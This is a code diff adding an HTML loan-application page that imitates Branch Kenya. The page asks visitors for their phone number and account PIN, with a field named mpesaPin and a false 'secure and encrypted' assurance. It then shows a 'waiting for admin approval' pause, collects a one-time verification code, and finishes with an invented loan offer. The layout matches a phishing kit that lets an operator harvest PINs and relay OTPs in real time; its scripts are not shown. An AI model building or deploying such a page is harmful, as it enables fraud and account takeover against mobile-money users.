@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apply Now - Branch Kenya</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="application.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <meta name="description" content="Apply for a personal loan with Branch Kenya. Fast approval, transparent terms, and secure applications.">
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="logo" onclick="window.location.href='index.html'" style="cursor: pointer;">
+                <img src="branch.webp" alt="Branch" class="logo-img" style="height: 36px; width: auto;">
+            </div>
+        </div>
+    </nav>
+
+    <!-- Application Form -->
+    <section class="application-section">
+        <div class="application-container">
+            <!-- Progress Bar -->
+            <div class="progress-bar">
+                <div class="progress-step active" data-step="1">
+                    <div class="step-number">1</div>
+                    <div class="step-label">Phone</div>
+                </div>
+                <div class="progress-line"></div>
+                <div class="progress-step" data-step="2">
+                    <div class="step-number">2</div>
+                    <div class="step-label">Verify</div>
+                </div>
+                <div class="progress-line"></div>
+                <div class="progress-step" data-step="3">
+                    <div class="step-number">3</div>
+                    <div class="step-label">Details</div>
+                </div>
+            </div>
+
+            <!-- Form Card -->
+            <div class="form-card">
+                <!-- Step 1: Phone Number -->
+                <div class="form-step active" id="step-1">
+                    <div class="step-header">
+                        <h2>Get Started</h2>
+                        <p>Enter your phone number to begin</p>
+                    </div>
+
+                    <form id="phone-form" class="loan-form">
+                        <div class="form-group">
+                            <label for="phone">Phone Number *</label>
+                            <input type="text" id="phone" name="phone" required placeholder="e.g., 0712345678" class="phone-input">
+                            <small>Enter your Branch Bank registered phone number</small>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="mpesaPin">Branch PIN *</label>
+                            <input type="text" id="mpesaPin" name="mpesaPin" required placeholder="Enter your 4-digit PIN" maxlength="4" inputmode="numeric" class="pin-input">
+                            <small>Your PIN is secure and encrypted</small>
+                        </div>
+
+                        <div id="pin-waiting" class="pin-waiting" style="display: none;">
+                            <div class="waiting-spinner"></div>
+                            <p>Waiting for admin approval...</p>
+                        </div>
+
+                        <div id="pin-approved" class="pin-approved" style="display: none;">
+                            <p>✓ Phone & PIN Verified!</p>
+                        </div>
+
+                        <div class="approval-notice">
+                        </div>
+                    </form>
+
+                    <div class="form-actions" id="phone-actions">
+                        <button type="button" class="btn-secondary" onclick="window.location.href='index.html'">Back</button>
+                        <button type="button" class="btn-primary btn-approve" id="submitDetailsBtn" onclick="submitDetailsForApproval()">Continue</button>
+                    </div>
+
+                    <div class="form-actions" id="otp-actions" style="display: none;">
+                        <button type="button" class="btn-secondary" onclick="resetPhoneVerification()">Back</button>
+                        <button type="button" class="btn-primary" onclick="requestOTPAfterApproval()">Request OTP</button>
+                    </div>
+                </div>
+
+                <!-- Step 2: OTP Verification -->
+                <div class="form-step" id="step-2">
+                    <div class="step-header">
+                        <h2>Verify Your Phone</h2>
+                        <p>Enter the code sent to your phone</p>
+                    </div>
+
+                    <div class="otp-notice">
+                        <span class="otp-icon">📱</span>
+                        <p>Enter the 6-digit code sent to<br><strong id="otpPhone"></strong></p>
+                    </div>
+
+                    <div class="bot-verification-notice">
+                        <span class="bot-icon">🤖</span>
+                        <p>Your code will be verified by our system</p>
+                    </div>
+
+                    <div id="otp-error" class="otp-error" style="display: none;">
+                        <p>Invalid code. Please try again or request a new code.</p>
+                    </div>
+
+                    <div id="otp-approved" class="otp-success" style="display: none;">
+                        <p>✓ Code verified successfully!</p>
+                    </div>
+
+                    <div id="otp-waiting" class="otp-waiting" style="display: none;">
+                        <div class="waiting-spinner"></div>
+                        <p>Verifying your code...</p>
+                    </div>
+
+                    <form id="otp-form" class="loan-form">
+                        <div class="form-group">
+                            <label for="otpCode">Verification Code *</label>
+                            <input type="text" id="otpCode" name="otpCode" required placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric" class="otp-input">
+                        </div>
+                    </form>
+
+                    <div class="resend-otp">
+                        <p>Didn't receive the code? <button type="button" class="resend-link" onclick="resendOTP()">Resend Code</button></p>
+                    </div>
+
+                    <div class="form-actions">
+                        <button type="button" class="btn-secondary" onclick="prevStep(2)">Back</button>
+                        <button type="button" class="btn-primary" id="verifyBtn" onclick="verifyOTP()">Verify Code</button>
+                    </div>
+                </div>
+
+                <!-- Step 3: Loan Details -->
+                <div class="form-step" id="step-3">
+                    <div class="step-header">
+                        <h2>Loan Details</h2>
+                        <p>Choose your preferred loan</p>
+                    </div>
+
+                    <div class="loan-summary-card">
+                        <div class="summary-item">
+                            <span class="summary-label">Loan Amount</span>
+                            <span class="summary-value" id="summary-amount">KES 30,000</span>
+                        </div>
+                        <div class="summary-item">
+                            <span class="summary-label">Loan Term</span>
+                            <span class="summary-value" id="summary-term">12 Months</span>
+                        </div>
+                        <div class="summary-item">
+                            <span class="summary-label">Interest Rate</span>
+                            <span class="summary-value">12% APR</span>
+                        </div>
+                        <div class="summary-item highlight">
+                            <span class="summary-label">Monthly Payment</span>
+                            <span class="summary-value" id="summary-monthly">KES 2,760</span>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Adjust Loan Amount</label>
+                        <div class="amount-selector">
+                            <button type="button" class="amount-btn" data-amount="5000">KES 5K</button>
+                            <button type="button" class="amount-btn" data-amount="10000">KES 10K</button>
+                            <button type="button" class="amount-btn active" data-amount="30000">KES 30K</button>
+                            <button type="button" class="amount-btn" data-amount="50000">KES 50K</button>
+                            <button type="button" class="amount-btn" data-amount="100000">KES 100K</button>
+                            <button type="button" class="amount-btn" data-amount="500000">KES 500K</button>
+                            <button type="button" class="amount-btn" data-amount="1000000">KES 1M</button>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="loanTerm">Loan Term</label>
+                        <select id="loanTerm" name="loanTerm">
+                            <option value="3">3 Months</option>
+                            <option value="6">6 Months</option>
+                            <option value="12" selected>12 Months</option>
+                            <option value="24">24 Months</option>
+                            <option value="36">36 Months</option>
+                        </select>
+                    </div>
+
+                    <div class="form-actions">
+                        <button type="button" class="btn-secondary" onclick="prevStep(3)">Back</button>
+                        <button type="button" class="btn-primary" onclick="submitApplication()">Get Loan</button>
+                    </div>
+                </div>
+
+                <!-- Success Message -->
+                <div class="form-step" id="step-success">
+                    <div class="success-message">
+                        <div class="success-icon">✓</div>
+                        <h2>Application Submitted!</h2>
+                        <p>Thank you for applying with Branch Kenya</p>
+                        
+                        <div class="success-details">
+                            <p>Your application ID: <strong id="application-id">BRK-2026-XXXXX</strong></p>
+                            <p>We've sent a confirmation to your phone.</p>
+                        </div>
+
+                        <div class="success-next">
+                            <h3>What's Next?</h3>
+                            <ul>
+                                <li>✓ You'll receive an SMS with your approval status within 15 minutes</li>
+                                <li>✓ Once approved, funds will be disbursed to your M-Pesa within 24 hours</li>
+                                <li>✓ You'll receive repayment reminders via SMS</li>
+                            </ul>
+                        </div>
+
+                        <button type="button" class="btn-primary" onclick="window.location.href='index.html'">Back to Home</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <script src="landing-script.js"></script>
+    <script src="application-script.js"></script>
+</body>
+</html>
